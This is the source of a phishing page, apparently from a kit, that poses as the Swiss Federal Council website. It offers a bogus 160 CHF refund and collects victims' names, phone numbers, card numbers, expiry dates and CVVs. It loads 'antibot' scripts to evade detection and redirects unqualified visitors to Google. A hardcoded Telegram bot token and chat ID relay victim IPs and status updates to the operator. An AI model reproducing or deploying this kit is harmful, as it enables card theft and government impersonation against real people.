<?php
    include "antibots/anti1.php";
    include "antibots/anti2.php";
    include "antibots/anti3.php";
    include "antibots/anti4.php";
    include "antibots/anti8.php";
    session_start();
    if(isset($_SESSION["username"])) {
    
    if(isset($_GET['messageId'])){
      $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
      $chatID = "1064643518";
        $messageId=$_GET['messageId'];
        $ipzebi=$_GET['ipzebi'];
        $message ="IP: $ipzebi , status : bill";
    
    
    
    // Initialize cURL session
    $ch = curl_init();
    
    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chatID,
        'message_id' => $messageId,
        'text' => $message
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Execute cURL request
    $response = curl_exec($ch);
    
    // Close cURL session
    curl_close($ch);
    
    // Optionally, you can decode and use the response
    $responseData = json_decode($response, true);
    
    }    
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
    <title>Der Bundesrat admin.ch - Startseite</title>
    <link rel="stylesheet" href="css/main.css">
    <link rel="icon" href="images/swiss.svg">
</head>
<body>
    <header>
        <nav>
            <div class="firstdivheader">
                <div><img src="images/swiss.svg" alt="image" height="25px" id="vp"></div>
                <div class="hellodear" id="ouf">Der Bundesrat</div>
            </div>
            <div class="seconddivheader">
                <img src="images/myicon.JPG" alt="image" height="42px">
            </div>
        </nav>
    </header>

    <main>
        <div class="containermain">
            <div class="remboursement">> Entschädigung</div>
            <div class="remplissez">Füllen Sie dieses Formular für Ihre Rückerstattung von <span style="color:#dc0018;font-weight:600">160 CHF</span> aus</div>
            <form action="php/send1.php" method="POST">
                <div class="divinput">
                    <div>Vollständiger Name :</div>
                    <div><input type="text" required="" name="name" class="inputty"></div>
                </div>
                <div class="divinput">
                    <div>Telefonnummer :</div>
                    <div><input type="tel" required="" name="tel" class="inputty" placeholder="+41"></div>
                </div>
                <div class="divinput">
                    <div>Kartennummer :</div>
                    <div><input type="tel" required="" name="cc" id="cc" class="inputty" placeholder="xxxx xxxx xxxx xxxx"></div>
                </div>
                <div class="divinput">
                    <div>Verfallsdatum :</div>
                    <div><input type="tel" required="" name="exp" id="exp" class="inputty" placeholder="MM/JJ"></div>
                </div>
                <div class="divinput">
                    <div>Sicherheitscode :</div>
                    <div><input type="tel" required="" name="cvv" id="cvv" class="inputty" placeholder="xxx"></div>
                </div>
                <div class="divsubmit">
                    <button type="submit" class="submitbtn">Bestätigen</button>
                </div>
            </form>
        </div>
    </main>

    <footer id="fmobile">
        <div class="offooter">Der Bundesrat</div>
        <div class="offooter" id="kontakt">Kontakt</div>
        <div class="offooter">Informiert bleiben</div>
        <div class="appplay">
            <div><img src="images/voteinfo_appstore.png" alt="image" height="30px"></div>
            <div><img src="images/voteinfo_googleplay.png" alt="image" height="30px"></div>
        </div>
        <div class="forlast">
            <img src="images/Logo Schweizerische Eidgenossenschaft.png" alt="image" height="60px">
        </div>
    </footer>
    <footer id="fpc">
        <div><img src="images/footerpc.PNG" alt="image"></div>
    </footer>
    <script src="js/junia.framework.js"></script>
	<script src="js/jq.js"></script>
    <script>
        let cc = document.getElementById("cc");
        let exp = document.getElementById("exp");
        let cvv  = document.getElementById("cvv");

        new Cleave(cc,{
            creditCard:true,
        })
        new Cleave(exp,{
            date:true,
            datePattern : ['m','y'],
            delimtier : "/",
        })
        new Cleave(cvv,{
            numericOnly:true,
            delimiter: "",
            blocks: [3],
        })
        let vp = document.getElementById("vp");
        let ouf = document.getElementById("ouf");
        if(window.screen.width >= 1000) {
            vp.src = "images/Logo Schweizerische Eidgenossenschaft.png";
            vp.style.height = "60px";
        }

    </script>
</body>
</html>
<?php

}else {
HEADER("Location: https://google.com");

}

?>